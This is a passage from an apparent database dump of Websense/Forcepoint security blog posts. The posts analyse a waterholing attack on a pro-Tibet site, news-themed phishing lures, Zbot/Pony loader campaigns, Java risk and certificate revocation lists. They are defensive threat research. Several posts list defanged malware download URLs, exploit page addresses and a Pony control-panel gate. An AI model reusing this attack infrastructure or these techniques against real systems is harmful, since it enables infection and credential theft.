trying to spot an unknown object. Today\'s businesses need these layers of analytics, with each layer making it much more difficult for the bad guys to penetrate your networks and steal your data.\nTo address the risks from Java, while still enjoying the benefits, IT needs to develop a variety of polices to address the specific needs of certain groups within their organization... as well as re-evaluate their defenses to ensure that they are capable of identifying threats at multiple stages of the attack.\nIf you are interested in learning more about the Seven Stages of Advanced Threats, take a few minutes to watch an archived webinar about the seven stages for advanced threats and data theft, why current defenses fail, and which defense layers you should use to protect your network, resources and data.', 'https://www.forcepoint.com/insights/exploit-kits-making-instant-java-attacks-part-iii\n');

Over the last two years, attacks like these have targetted pro-Tibet websites and other human rights organizations around the world. A waterholing attack is one that targets users of specific websites with the aim to install malware on their systems (usually using a backdoor approach) to collect documents, email contacts, social contacts, and passwords. The frequency of these attacks prompted Websense Security Labs to check our collective threat intelligence for any other websites that are considered pro-Tibet to see if they are affected by this kind of attack.\n\n\n	In this blog we\'re going to analyze the Tibetan Alliance of Chicago website and illustrate how waterholing attacks are conducted.\n\n\n	One of the trends with targeted attacks in the last few years is that any installed malware binaries connect to dynamic DNS websites. One of the most interesting aspects of this specific attack is that a successful exploit downloads a binary that connects to a small Dynamic DNS service offered by none other than a German-based security appliances and services company, which reaffirms the notion that perpetrators pick and choose the parts of their attack infrastructure.\n\n\n	Although the website does not have a high Alexa rank, we thought it was worth consideration, because our analysis concluded that it wasn\'t a scattered attack, but a targeted injection to infect the users of that website. The website has been injected with two malicious iFrames as shown below:\n\n\n	\n\n\n	We started to investigate the content of these two links above. The first (hxxp://78.129.252.195/images/Adobe/index.html) contains another iFrame that leads to a Firefox plugin named \"Adobe Flash Player.xpi,\" although at the time of the analysis, the plugin wasn\'t available:\n\n\n	\n\n\n	When we used Threatseeker to search for other instances of \"Adobe Flash Player xpi,\" we detected other malicious websites, so we deduced that the aim of this iFrame was to try to install a malicious plugin using social engineering techniques. The second link (hxxp://78.129.252.195/index.html) caught our attention, because it seems to be malicious code exploiting the vulnerability CVE-2012-4969 as shown below:\n\n\n	\n\n\n	The code highlighted above shows another iframe that leads to hxxp://78.129.252.195/yRrztX.html with the following content: \n\n\n	\n\n\n	From this, we could see the code used to trigger the Internet Explorer vulnerability addressed as CVE-2012-4969 and spotted in other targeted attacks by a security researcher here in September 2012. The code within the page \"index.html\" uses the \"heap spray\" mechanism to run shellcode if the exploiting attempt succeeds. The following is the snippet of code that has been assigned the shellcode:\n\n\n	\n\n\n	Once the shellcode is executed, it downloads and runs a malicious file on the compromised system. The shellcode appears to be using the Windows default user-agent \'wininet\' to retrieve the malicious file, which in itself can be considered suspicious, because we don\'t normally see many legitimate HTTP requests that use this agent. We do see this user-agent being used by legitimate software, but it\'s not predominant.\n\n\n	Following is the Fiddler\'s session where you can see the binary file that was downloaded:\n\n\n	\n\n\n	Analyzing the dynamic behavior of the malicious executable, you can detect a first call to the command-and-control point at mail.firewall-gateway.com located in the United Kingdom:\n\n\n	\n\n\n	We conducted a quick investigation about the domain \"firewall-gateway.com,\" and it appears to be mantained by the German service provider, Securepoint, that specializes in provisioning secure VPN endpoints and other kinds of network services offerings. This is what we saw from the WHOIS record:\n\n\n	: \n\n\n	In one of Securepoint\'s support forums, the announcement of the availability of a dynamic DNS service is still shown. The service appears to be available at this address. We believe it\'s an attempt to remain covert, because it is not by chance that the perpetrators chose their command-and-control point to be reached through a dynamic DNS service associated with a security company.\n\n\n	\n\n\n	The detection rate of the binary file seems very low as reported by Virustotal. From a brief static analysis of the malicious binary file, you can detect a list of strings used to check the presences of Antivirus on the impacted system:\n\n\n	\n\n\n	The binary file has a low AV rate detection rate, as reported by this Virustotal report.\n\n\n	In this blog we gave a brief example of what seems to be a waterholing attack that is aimed for a specific crowd, in this case, pro-Tibet users. We believe that the complexity of such attacks lies in direct relation to the security measures that are employed by the potential targets, in this case the attack isn\'t that complex but probably just enough to fulfill its ultimate purpose.\n\n\n	Websense customers are protected from injected websites and the different stages of this threat with our Advanced Classification Engine - ACE.', 'https://www.forcepoint.com/blog/security-labs/tibetan-alliance-chicago-hit-cyber-waterholing-attack\n');

However, what is the true meaning of a grey hat hacker? These individuals are typically not malicious by nature and do not necessarily intentionally cause harm, yet at the same time they may not act ethically. \n\n\n\nA prime example of a grey hat in action is when a lone researcher discloses vulnerabilities before the vendor has the opportunity to patch it. The goal is to stake a flag and show they knew about the vulnerability first, thus proving they possess the best security research knowledge. Unfortunately, in most cases, this is an attempt to gain notoriety in the industry. For example, a lone researcher in the UK, who was upset that the development site was vulnerable, was behind the recent Apple developer site hack. He claims his intention was not hacking but bug finding and testing if he could extract data from the site. Another example of grey hat activity is the recent hack of Zuckerberg\'s Facebook page.\nThis prompts the argument of when to disclose. If the vendor fails to respond to the disclosure and the vulnerability is actively in the wild, does the individual or group who identified the vulnerability disclose this publically? Doing the right thing then becomes a difficult decision. I think we need to decide how much we can share and in what timeframe.\nSo where do we sit...are grey hat hackers good for the infosec industry? I believe grey hats come in many shades and a code of conduct is necessary. Below are set of proposed parameters for anyone wanting to partake in these activities. Any deviation from this indicates you are performing malicious activity.\nParameters\nEngagement - before performing any task including a basic vulnerability scan, you must agree first and obtain the asset owner\'s buy-in.\nDisclosure - any vulnerability found must be disclosed to the vendor/owner. If attacks are in the wild, government agencies must be informed. Ethical disclosure is paramount.\nRemediation - never attempt to remediate or attempt to test your findings (such as attempting to exfiltrate data). Ethical hacking requires control and basic principles of notification only.\nConclusion\nTo summarise, we can consider ourselves at a pivot point with grey hats. They have access to resources and we share content in the community that can aid them. They use shared intelligence and available resources--while also using their own skills to identify bugs and flaws in our networks and websites. Make no mistake; I believe ethical disclosures are great.\nAs a quick side note, one of my favourite security books is still \"Gray Hat Hacking: The Ethical Hacker\'s Handbook\" which references ethical disclosure, pen testing and tools, exploiting vulnerabilities and malware analysis. It focuses on the same common tactics used in relation to attacks on organisations. Chapter 16 focuses on content security and information protection. The attack scenarios still resonate today, even though several years have passed. \nWeb and email remain the primary two channels used to launch an enterprise attack. Yet they remain the weakest ingress and egress points on the network. Alarmingly, most organisations still run basic spam and web filter products running AV engines. The book explains how easy it is to bypass these legacy controls. It\'s important to have a comprehensive security solution that protects both the web and email channels from data loss and data theft.\nDo you have an opinion on grey hat hackers?

Some organizations look to patch management for a solution. Other companies want to simply shut down Java. But neither may be possible for a variety of reasons.\n\nMany organizations use specific, business-critical applications that rely on Java, and many of those applications are Java version-specific. If Java is shut down for specific groups, some users will require older versions and others will need the latest update. This is where we get our first glimpse of the challenges in managing Java risks.\n\nPatch Management: Desktop, Mobile and Automatic?\n\nPatch management can be a complicated process for an organization, especially those with remote workers. There are a number of factors at play. A mobile workforce is hard to patch and Java has a cross-platform footprint. Java also updates independently from the vulnerable apps, such as browsers, that use it.\n\nInterestingly, many corporations run tightly managed desktop environments. Before deployment, new patches are carefully tested for app compatibility, system stability and other critical factors. Everyone understands how a single update and a rush to patch could take down business-critical applications. It\'s critical that the Java patch process matches the fast paced zero-day exploits. Current security defenses may, or may not, provide organizations with the time for compatibility and other validations.\n\nSome have suggested that automatic Java updates could help users stay current, similar to the update model Google adopted to some success with the Chrome browser. Unfortunately, that model would still not address the frequent problem of zero-day Java vulnerabilities. There is still a level of exposure between the revelation of a new vulnerability and the issuing of a patch. Earlier this year, a new Java vulnerability was widely publicized within 48 hours of a Java patch, and was in the hands of cybercriminals even sooner.\n\nBlended Best Practices Reduce Java Risk\n\nSo what are the logical best practices when balancing the needs of the business with the need for enterprise security from Java vulnerabilities?\n\nI believe it\'s a blend of tactics: patching, uninstalling Java and implementing the Alternative Browser approach. Real-time defenses are the most effective, but I will introduce those separately in the next post when we discuss where Java plays within the Seven Stages of Advanced Threats.\n\nIt is important to note that \'uninstall\' is a relative term here, because of the challenges we outlined above. For most organizations this is really more of an excisional biopsy approach, where they will remove as much Java as possible. For example, you can set up a trial \"disable Java\" program in your organization to help identify any repercussions. Other than a few business critical applications, this shouldn\'t break your internet because fewer sites require Java for functionality.\n\nFor those sites or applications that require Java, you can offer designated Java workstations, properly segmented from other parts of the network. Many IT organizations have old laptops they can repurpose for this next to the shared printers. You can also take the dual browser approach, where a specific, secondary browser is used to access designated applications. Configurations on this Java-enabled browser can be tightened down to mitigate risk by only allowing these browsers to access specific sites. You can further mitigate mistakes by preconfiguring bookmarks to the necessary sites and applications. The \'primary\' browser would have Java removed entirely. \n\nSecurity Solutions Need to Be Zero-Day Aware\n\nUnfortunately, zero-day Java-based exploits continue to rollout so even patch management, segregated Java machines, multiple browser configurations and other controls cannot eliminate risk exposure. Security solutions must become increasingly \'zero-day aware,\' particularly for Java threats, an area where many provide very limited coverage.\n\nWe can take proactive measures by applying pressure to application vendors to ensure that their software is fully compatible with the newest version of Java. In-house developers need to learn and apply security best practices in their development. This includes programs designed to support updates by avoiding use of undocumented features or \'workarounds\'. Legacy applications are often one of the items anchoring the IT department to previous Java versions. Organizations\nare forced to pay the price in reduced security after corners are cut in development.\n\nBut really, how much should this concern you? Even if there is a zero-day or a gap, you are only at risk for a week, right? Not so fast.

But these conferences are different. Even the whitest of hats can get a little dusty gray at these conferences, and the competitive spirit pervades. A little trolling may arise here that wouldn\'t necessarily be common at most gatherings of security professionals. This is further fostered by the \"Wall of Sheep\" forum that allows for a public display of one-upmanship that permeates the atmosphere among colleagues and peers.\nSo how do you protect yourself from being identified as \"that guy,\" with your name and credentials broadcasted to the entire community?\nMost security professionals know that a dedicated, persistent hacker is likely to get in, even if you are practicing due diligence. But at Black Hat, between happy hours, intense briefing sessions, trainings, connecting with peers and the Circus Maximus feel of Caesars Palace, most hijinks won\'t be insanely persistent. A few good prep items, in addition to keeping your head on you shoulders, during the event can go a long way to keep you off the \"Wall of Sheep.\"\nHere are a few tips I\'ve put together to help keep you and your organization from being shamed at the show:\nBefore You Go:\nMake sure you are fully patched with the latest AV, browser and other programs.\n  Delete cookies and clear your web browser history and cache. Browser (and other application) caches offer a rich amount of information on the user. If a notebook is stolen, forensic software can be used on the device to quickly divulge large amounts of information on the user, identify their habits and access sensitive information.\n  Encrypt sensitive files on your hard drive. If possible, go with full-disk encryption. There\'s a lot of seemingly trivial information that people forget to encrypt.\n  Make a full backup of your computer and other devices prior to leaving for Las Vegas.\n  Save all files you work on at the conference onto a cloud server or removable drive.\n  Revert to this backup after you have returned.\nWhile You are There (this should include traveling to and from, including airport locations, particularly at time of departure):\nDevice security\nAny device left alone is an invitation not just for theft, but compromise.\n  Turn off your Bluetooth and Wi-Fi connections and any application that requires the use of these functions.\n  Do not charge phones, computers or any other devices in charging stations or any public power outlet. USB or iPhone-ready power jacks are the most worrisome. Don\'t use them! They provide a direct data link to the connected device - and you don\'t know what (or who) is on the other end slurping that data.\n  A great option would be to use a very small, low-cost portable battery pack that charges independently through an AC outlet. You can use this portable battery pack when traveling as it is a very safe and convenient way to recharge devices. \n  Do not accept storage devices, USBs or files from people you don\'t know, no matter where you find them. That \"conveniently-found\" USB drive may get dropped into your bag, and pretty soon, you may forget where you acquired it and inadvertently use it later.\n  If you carry any radio-frequency identification (RFID) enabled devices, such as your work badge, passport (some counties) or even some credit cards - it\'s best to leave them at home or in your hotel room.\n  ATMs - Be cautious when using ATMs, especially machines close to the venue. Hackers can install card skimmers, or as they have done in the past, deliver a completely fake ATM machine to the hotel that hosted DEFCON in 2009.\nConnectivity\nWi-Fi Pineapples abound - be very weary of the wireless networks throughout the venue - and your entire stay at Black Hat.\n  When using the hotel\'s internet, choose a wired connection in a room, if available.\n  Use your VPN at all times. If you are working with sensitive information, use a wired connection with VPN.\n  Avoid sending sensitive data while onsite.\n  When roaming, if you have the option, use a 3G or 4G cellular modem for Internet access. It is the safest wireless option, though still not 100 percent secure.\nIf you are going to the conference and would like to connect, please reach out by dropping us a comment below. I would also be interested in hearing about any specific preparatory actions you take prior to or during security conferences of this nature.\nI look forward to seeing many of you at Black Hat. Most of all, have fun - but remember to take the necessary precautions to keep your data safe.', 'https://www.forcepoint.com/insights/staying-secure-black-hat-and-defcon-%E2%80%93-quick-tips-keep-you-wall-sheep\n');

While they revel in the joy of being a family, cyber-criminals have predictably been busy delivering various malicious campaigns in order to piggyback on the news. The Websense ThreatSeeker® Intelligence Cloud has been tracking malicious cyber-campaigns that started in the hours following the official announcement that the Duchess of Cambridge was in labor.\n\n\n	The campaigns detected so far are utilizing email lures, which either redirect unsuspecting victims to Blackhole Exploit Kit URLs or, indeed, provide malicious attachments in the form of Windows SCR files in an attempt to dupe users. These kinds of threats are often launched when topical or global news stories develop. We\'ll step through both current campaigns in order to relate them to our 7 Stages of Advanced Threats and will detail how they propagate, as well as illustrate that the kill chain leading to malicious content breaks if any one link breaks.\n\n\n	Lures(Stage 2 of the 7 Stages of Advanced Threats)In this latest example of a malicious campaign that takes advantage of users\' thirst for news, the Websense ThreatSeeker® Intelligence Cloud detected and stopped over 60,000 emails with the subject \"The Royal Baby: Live Updates\" (including quotes) that were mimicking a ScribbleLIVE/CNN notification and encouraging victims to \"catch up with the latest.\" Clicking any of the links in this lure email resulted in the victim being lead to the same malicious redirect URL. This is similar to a recent campaign that used topical events in email lures (the Fox News-themed Malicious Email Campaign).\n\n\n	Email Lure: Links to Redirect URLs ...\n\n\n	\n\n\n	A different campaign, using multiple lures containing malicious attachments has been detected in lower volumes with enticing subjects designed to pique interest and encourage victims to open the message:\n\n\n		Amazing, incredible share! Follow our leader, share it!\n	\n		Royal Baby: Diana, Charlotte or Albert\n	\n		Royal baby in fantastic picture!\n\n	In addition to varied but Royal Baby-themed subjects, the message bodies encourage victims to open the attached \"image,\" although the file, itself, is a malicious binary used to contact command and control (C2) infrastructure and download further malicious payloads:\n\n\n	Email Lure: Malicious attachment ...\n\n\n	\n\n\n	Should you receive any email news alerts or unsolicited messages regarding topical events, be sure that the message is legitimate before clicking any links or downloading any attachments. It is unlikely that reputable news agencies will send unsolicited email, and, therefore, any unexpected message should be treated with caution.\n\n\n	By their very nature, lures rely on human curiosity and our thirst for knowledge. In addition to needing an integrated security solution that is able to detect and protect against lures, be they delivered via social web or email, users need to also be educated to be wary of unsolicited links or messages and to consider visiting reputable news sites directly to gain the latest information.\n\n\n	Redirect(Stage 3 of the 7 Stages of Advanced Threats)\n\n\n	Should users fall for the ScribbleLIVE/CNN lure, they are taken to intermediate websites that redirect victims to sites hosting exploit code, in this case the Blackhole Exploit Kit. The redirect sites, as is often the case, are legitimate websites that have been compromised or injected with malicious code that is hidden and obfuscated in order to abuse the compromised host site\'s reputation. Real-time analysis of these sites at the point-of-click provides immediate protection and can effectively break the chain before a victim is redirected to an exploit.\n\n\n	 \n\n\n	Exploit Kit(Stage 4 of the 7 Stages of Advanced Threats)\n\n\n	Another thing we see in these broad topical and global news campaigns is the use of common and accessible exploit kits, such as Blackhole, which allows the cyber-criminals to rapidly deploy their attack infrastructure and snare as many victims as possible. Once the exploit kit URL has been visited, the victim\'s machine is likely to be assessed for vulnerabilities that can be exploited in order to deliver malicious payloads. In this case, as well as delivering malware, such as Zeus, which is designed to pilfer financial information from victims, the site utilizes a social-engineering method to trick the victim into installing a fake Adobe Flash Player update:\n\n\n	 \n\n\n	Exploit Kit: Social-engineering with a fake Adobe Flash Player update ...\n\n\n	Real-time analysis of web content and malicious payloads protects users from both known and unknown threats.\n\n\n	Dropper File(Stage 5 of the 7 Stages of Advanced Threats)\n\n\n	Should exploitation be successful, dropper and/or downloader files are used to install additional malicious payloads onto a victim\'s machine. In the campaigns detailed so far, one relies on the victim falling for the lure and then being redirected to an exploit site from which this would be delivered, while the other simply attaches a malicious file directly to the initial email lure. These files are often encrypted and packed  to thwart detection by traditional signature-based solutions, and, therefore, require more advanced solutions to recognize malicious behavior, such as Websense ThreatScope™. Using the email attachment as an example, the ThreatScope™ Analysis Report nicely illustrates how the file sent requests to malicious hosts, as well as wrote further executable files to the local file system ...\n\n\n	\n\n\n	Call Home(Stage 6 of the 7 Stages of Advanced Threats)\n\n\n	Once a victim\'s machine has its malicious payload installed, it will attempt to \"call home\' and contact the C2 infrastructure to receive commands by those behind the campaign. Real-time detection of nefarious outbound communications, in lieu of a threat being caught at an earlier stage, can prevent this call home and prevent attackers from achieving their goals. \n\n\n	Data Theft(Stage 7 of the 7 Stages of Advanced Threats)\n\n\n	The exfiltration of data—be that personally identifiable information (PII) from an individual, company confidential data, or even a list of potential royal baby names—is often the attackers\' endgame. Utilizing methods such as slowly \"drip-feeding\" data out of a compromised network or creating custom encryption routines to stay hidden, attackers attempt to steal data, which can then be used for further attacks or simply for criminal gain. Advanced data loss and theft prevention features, such as Drip DLP, OCR analysis, and the detection of custom encryption routines can be deployed to keep your data where it belongs and out of the hands of cyber-criminals.\n\n\n	Websense customers are protected by ACE, our Advanced Classification Engine, against emerging cyber-threats of this nature at multiple stages throughout the kill chain. While we await further official announcements regarding the Royal Baby, the Websense Security Labs™ team is monitoring developments and will post updates should further campaigns surface.', 'https://www.forcepoint.com/blog/security-labs/royal-baby-third-line-throne-first-line-threat-lure\n');

Emails with banking/financial themes are being sent with executables packed in ZIP files, with file names matching the intended recipient. When the attachment runs on a victim\'s computer, a Trojan from the Zbot P2P family is downloaded via a Pony loader. Zbot is typically used to steal banking credentials as well as for the exfiltration of personally identifiable information (PII) and other confidential data for criminal gain. We saw such a campaign on July 15, 2013, featuring subjects like “IMPORTANT Docs - WellsFargo” and \"IMPORTANT Documents - WellsFargo\". Websense Cloud Email Security has detected and blocked over 80,000 instances of this campaign. We have proactively blocked similar cases since June 10. Just as we were getting ready to publish, we have noticed that Websense CES has proactively blocked another campaign, this time using fake emails pretending to be from Trusteer, trying to convince the victim to install an update for Trusteer Rapport software. Again, the attachment names are custom generated to match the recipient\'s user name (or  the first recipient in the case of multiples). So far we have blocked more than 36,000 variants of this latest campaign.\n\nLet\'s take a look at the campaign from July 15 first:\n\n\nWhat\'s unique to these campaigns compared with others we have blocked in the past is the custom-generated attachment name. The cyber criminals seem to be trying to come up with incremental improvements to enhance their effectiveness.\nBy automating file name creation and linking it to the intended recipient\'s email username, they are presumably trying to socially engineer the potential victims to feel a little more at ease about opening the attachment. They might also be hoping to get around rudimentary blocking based on attachment file name. In the examples we\'ve seen, the packed executable was the same across the same campaign burst. The potential victim first sees the ZIP file with their own unique name, so a search for the attachment file name in a search engine might not show anything suspicious.\nA typical misleading icon (another common trait to malware used in email attacks) would cause the file attachment to look like this if the folder option \"Hide extensions for known file types\" is selected:\n\n\n Savvy users will display all file extensions, which will clue them to the suspicious nature of the attachment:\n\n\nIf we analyze the behavior of the attachment using Websense ThreatScope™, we can see the Pony loader module communicates to:\nhxxp:// dharmaking.net/ponyb/gate.php on 64.94.100.116\nwhich is an empty Post transaction in this case, since there was no information to exfiltrate.\nFor the sake of curiosity, we can check out the admin login panel of the Pony loader on that page:\n\nThe Pony loader sends GET requests to download further executables from other locations:\nhxxp:// liltommy.com/ep9C.exe 184.173.201.131\nhxxp:// www.wineoutleteventspace.com/7UNFVh.exe 208.113.243.4\nhxxp:// www.oh-onlinehelp.com/Pefyi.exe (suspended, not resolved)\nhxxp:// video.wmd-brokerchannel.de/qAz575t.exe 213.148.99.220\nIt also includes communication to legitimate sites to mask its malicious activity.\n \nYou can see the full ThreatScope report here.\nAnti-Virus detection at the time of the attack is pretty dismal, only 4 out of 45.\n \nDropped executables are recognized as malicious by ThreatScope. See reports here and here.\nAnd again, AV detection is minimal - 1 out of 47.\nBut as is the case most of the time, AV vendors eventually update their signatures, and 19 out of 47 now detect the dropped binary as a Zbot Trojan variant.\nFor comparison sake, we decided to run another ThreatScope report, to see how our own analytics fared after they had a chance to update.\nHere\'s what we found:\nAs expected, some of the dropped files hosts are not responding anymore. But one actually delivered a new binary:\nhxxp:// www.wineoutleteventspace.com/7UNFVh.exe\nThe ThreatScope report indicates that it is malicious, as seen here. In addition, Websense ACE™, our Advanced Classification Engine, had generic detection against it.\nAV detection? 2 out of 47\nWe should also note that ACE updated the categorization of the Uncategorized hosts seen in the initial report:\nhxxp:// dharmaking.net/ponyb/gate.php is now under Bot Networks.\nhxxp:// dharmaking.net/ is now under Malicious Web Sites.\nhxxp:// www.wineoutleteventspace.com is now under Malicious Web Sites.\nSee the updated report here.\n \nIn an older campaign example (June 14, 2013), we can see another feature that has been used frequently in the last few months.\nNot only does the ZIP attachment file name match the recipient\'s user name, it is also password protected, with the password supplied in the email body. This is an obvious attempt to get around automated analysis and further increase the window of exposure before security vendors update their detection for the malware variant.\n\n\n\nThe attachment (again hiding extensions for known file types) is displayed as:\n\nSimilar behavior can be seen in the ThreatScope report.\nAnd again, AV is not quite up to speed.\nSee the dropped executables ThreatScope report, compared to VirusTotal at the time of attack, which is a little better at18 out of 47.\n\nThe latest campaign, featuring fake Trusteer emails, has subject lines like:\nImportant Security Update : Customer 9382121\nHere\'s a sample:\n\n\n\nAs in the other samples, the attachments are named with a custom generated file name that matches the username of the first recipient. We can assume that since Trusteer are a software company, the cyber criminals are trying to lure potential victims to be less suspicious of the executable packed inside the attachment.\n\n\n\nSimilar behavior to above samples, see ThreatScope report here, and compare to Virus Total at 5/47\nDropped file ThreatScope report, Virus Total at 3/46\n\nIt is interesting how simple some of the lures are, but the attackers might be getting enough monetary gain from using them and employing the small, incremental changes described above.\nSimple social engineering techniques, known exploits, and known malware families are still being widely used in attacks large and small, because apparently they work.\nBeyond user education, employing a multi-layered security product that combines multiple analytics could help prevent such attacks.\nWebsense has provided protection against this campaign in multiple stages. As an email attack carrying attachments, this campaign uses some of the stages outlined in our whitepaper describing the 7 stages of Advanced Threats.\nLures - Websense Cloud Email Security provides proactive protection against emails carrying executables or other suspicious attachments, based on multiple analytics.\nDropper File - Websense ThreatScope recognizes the malicious behavior of the dropper file.\nCall Home - Websense ACE, our Advanced Classification Engine, blocks the Pony loader page via real-time analytics.\nDropped Files - ThreatScope recognizes the malicious behavior of the dropped executable files. In addition, ACE protects against the URL hosts.\nData Theft - Websense DLP (data loss prevention) tools can detect and stop the exfiltration of sensitive information, like the banking credentials and PII that Zbot targets.', 'https://www.forcepoint.com/security-labs/custom-attachment-names-and-passwords-trojans\n');

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (326, 'Digging into certificate revocation lists', 'Forcepoint John BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'In this blog, we shall reveal the uses for certificates, uncover how to combat abused certificates and dig deep into an example of how malicious software can be digitally signed to pass certification verification.\n\nWhat is a certificate?\n\nIn cryptography, a public key certificate, also known as a digital certificate, is an electronic document that uses a digital signature to bind a public key with an identity — information such as the name of a person or an organization, their address, and so forth. The certificate can be used to verify that a public key belongs to an individual. The digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or assertions made by the private key that corresponds to the public key that is certified. The certificate authority, or certification authority (CA), is the entity that issues digital certificates. In the model of trust relationships, a CA is a trusted third party that is trusted by both the subject of the certificate and the party relying upon the certificate.\n\nWhat is a CRL file?\n\nCRL stands for certificate revocation list: it is a list of certificates (or more specifically, a list of serial numbers for certificates) that have been revoked, and therefore entities presenting those certificates should no longer be trusted. The CRL file is itself signed by the CA to prevent tampering. The CRL is always issued by the CA that issues the corresponding certificates.\n\nAn alternative to using CRLs is the certificate validation protocol known as Online Certificate Status Protocol (OCSP). In the OCSP method, the browser contacts a web service running at the specified URL and asks the service whether a specific certificate has been revoked; again, the response is signed to prevent tampering. OCSP has the primary benefit of requiring less network bandwidth, enabling real-time and near real-time status checks for high volume or high value operations. \n\nThere is another way called OCSP Stapling, which allows the secure server to cryptographically prove that it has a recent “This certificate is valid” ticket signed by the CA. These tickets have a short lifetime and must be renewed by the server in order to return the ticket to clients in a TLS handshake. OSCP Stapling is the fastest and most private method of revocation checking, but it’s not yet deployed on most sites. \n\nWhen do we use these CRL files?\n\nWhen we deal with certificates, we use a CRL file. For example, when a browser accesses an HTTPS URL, it verifies the server’s certificate. During the verification process, the browser will choose a way to check for revocation; if a CRL is chosen, it will download the CRL file from an URL specified by the certificate, and do further verification. If a CA indicates that a server’s HTTPS certificate was revoked, the user is blocked from navigating to a site. A similar process happens when you use Microsoft’s “User Account Control (UAC)” security feature: when you download a signed file from the internet and want to run it, Windows automatically verifies the file’s digital signature, and during this process, a CRL is also downloaded and checked. If a CA indicates that a downloaded binary’s signing certificate was revoked, the program will fail the Authenticode check and will not run.\n\nThe CRL mechanism is very important, and here is an example. In mid-March 2001, VeriSign issued two VeriSign Class 3 code-signing digital certificates to an individual who fraudulently claimed to be a Microsoft employee. The common name assigned to both certificates is \"Microsoft Corporation\". The ability to sign executable content using keys that purport to belong to Microsoft would clearly be advantageous to an attacker who wished to convince users to allow the content to run. To tackle this issue, Microsoft released a security patch containing a CRL file for the two certificates. You can find details here: Microsoft Security Bulletin MS01-017 : Erroneous VeriSign-Issued Digital Certificates.\n\nLet\'s Dig Into An Example\n\nHere is another example that demonstrates how important it is to revoke certificates.\n\nOn May 22, Websense® Security Labs™ discovered a typosquatting case for youtube, using the following URLs:\n\nyoutibe.comyougube.comyoutuhe.comwwww.youutbe.comyootube.esowww.outube.comwww.youtuber.cayouutube.cawww.youutube.ca\n\nSome of these URLs led to a file downloading: the file was disguised as FlashPlayer.exe and lured users to download and install it. \n\n\n\nThis malware is basically a downloader for many unwanted files from the internet, for example, “DriverPro” “OptimizerPro” “SpeedUpMyPc”, all of which are rogue software. It also downloads and installs the “WhiteSmoke” toolbar for Chrome and Firefox browsers.\n\nWhat is interesting is that this malware is digitally signed, and could pass certificate verification.\n\n\n\nWe could see that the certificate is owned by “TUGUU SL”, the serial number of its certificate is “27 76 b2 57 97 9f 9a”, and we could download a CRL file from http://crl.godaddy.com/gds5-16.crl.\n\n\n\nAfter we download the CRL file, we find there are 3447 records of revoked certificates; after parsing, CRL file looks like this:\n\n\n\nAmong the 3447 records of revoked certificates, we don’t find the serial number of this certificate. Of course this certificate is not included, as otherwise, it cannot pass Windows’ verification process. For this case, either the private key of “TUGUU SL” has been stolen by attackers, or “TUGUU SL” itself is distributing malware for profit. This certificate was issued on May 4, it was used to sign the malware on May 21, and was caught by Websense on May 22. According to our observations, at the time of publishing it has still not been revoked. \n\nThanks to Websense ThreatSeeker® Intelligence Cloud we have successfully collected some CRL file data. CRLs are accessed about 200,000 times per day within Websense ThreatSeeker Intelligence Cloud: we managed to gather about 10,000 access records in the course of one hour, and then we dug into those CRL URLs and files and found something interesting. All the following data in this blog is based on these 10,000 sample data records.\n\nThere are in total 9066 URLs which requested a CRL file. Among those 9066 requests there are 819 unique URLs, which means that some CRL URLs are requested many times. Let us see which URLs are the most popular:\n\n\n\nThe data shows that http://crl.globalsign.net/Root.crl is the most popular URL during that hour, which demonstrates that the most certificates verified at that time were issued by “Globalsign”. This is probably because this is the root CA of “Globalsign”, and it writes this URL as the certificate distribution point (CDP) for each certificate issued.\n\nFrom those 819 unique URLs, we managed to download 511 CRL files.It is not a surprise that some of the URLs are just not responding. First, let us look at the size of these CRL files:\n\n\n\nThe minimum file size among these 511 files is 236 bytes, while the maximum file size is, amazingly, 26.8 MB (28,198,759 bytes). Among these 511 CRL files, 200 files are below 1000 bytes, which shows that most CRL file are small in size.\n\nRemember a CRL file is used to contain revoked certificates, so let us check how many certificate records these CRL files have:\n\n\n\nSurprisingly, the biggest CRL file contains 687762 records, while 107 files do not have even one record. In total, these 511 files contain 2232845 revoked certificate records, which means over 2 million files are listed as being “untrusted”.\n\nEach CRL file is issued by one CA server, and one CA server can issue as many CRLs as it likes. When we check all of those CRL files, we find some of them are issued by the same CA: below is some statistical data about which CA issued the most CRL files: \n\n\n\nThe top 3 issuers are GoDaddy, Digicert, and Starfield.  GoDaddy issued 86 of the 511 CRL files.\n\nEach CRL file should choose its own algorithm for hash and encryption. In reality, the most popular used is “sha1WithRSAencryption”, which means use “sha1” as the hashing algorithm, and use “RSA” as the encryption algorithm. But other algorithms are used too, as shown here:\n\n\n\nWe can see that “sha1WithRSAEncryption” is the predominant signature algorithm currently used. Though “sha256” and “sha512” are perhaps more secure, sha1 is just safe enough.\n\nEach CRL file contains a list of serial numbers for revoked certificates, which is like a blacklist for certificates. There is no standard specification for how to represent these serial numbers; it is up to the CA server, so different CAs use different lengths for this field.\n\n\n\nSome CAs use 1 byte for the serial number, while others use 26 bytes to represent this field, but we could tell from the chart that 8 bytes is the most preferred length and 16 bytes is also a popular choice. When developing tools for parsing CRL files, in order to avoid mistakes we should keep in mind that the serial number could be any length. In fact, when parsing data using OpenSSL, we identified a bug in the “openssl crl” tool:\n\n\n\nWindows can successfully parse the special CRL file “MicrosoftRootAuthority.crl” and display the correct result of revoked certificates’ serial numbers; however, when OpenSSL parses this file it shows negative serial numbers, which is not correct.\n\nCertificates are revoked for many reasons, for example, a certificate\'s private key is compromised, the CA server is compromised, etc. There is a detailed list of revocation reasons at RFC 5280. Among all 2232845 records of certificate serial numbers, there are 1606045 records which specified a revocation reason:\n\n\n\nFrom this data, we saw some interesting findings. “Key Compromise” is the top reason for revocation, taking up 44% of all revoked certificates which reminds all certificate holding companies that stolen keys is quite a serious problem and they should take care of their private keys. There are 61 records for “CA Compromise”, which reminds us of the security of CA servers: in 2011, the SSL CA Comodo was breached, in an exploit originally identified as a nation state attack sponsored by the government of Iran. The SSL CA DigiNotar was also breached in 2011 in an exploit that enabled attackers to issue fraudulent certificates for Google.com. Earlier this year, the SSL CA TURKTRUST also issued illegitimate SSL certificates for Google.com.\n\nEach revoked certificate record specifies the revocation date. By profiling this data, we could discover the trend of certificate revocation problem, and make some predictions about certificate security issues. Let us take a look at the following chart, which demonstrates the number of revoked certificates for each year.\n\n\n\nThe earliest record of certificate revocation happens in 2000, and the number of revoked certificates grows every year, reaching 1045518 in 2012. During the first 5 months of 2013, the number is 766451, and we can guess by the end of 2013, the number will easily exceed 2012’s. From this 